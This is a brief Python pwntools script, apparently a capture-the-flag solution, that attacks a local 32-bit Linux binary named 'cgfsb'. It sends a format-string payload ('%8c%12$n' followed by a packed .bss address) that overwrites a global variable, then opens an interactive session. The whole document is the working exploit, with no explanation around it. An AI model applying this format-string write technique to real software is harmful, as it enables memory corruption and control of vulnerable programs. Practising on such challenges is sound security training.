from pwn import *
context(os='linux',arch='i386',log_level='debug')
io = process('/home/tom/Desktop/cgfsb')
_bss=0x0804A068
payload="%8c%12$n"+p32(_bss)
io.recv()
io.sendline("a")
io.recv()
io.sendline(payload)
io.interactive()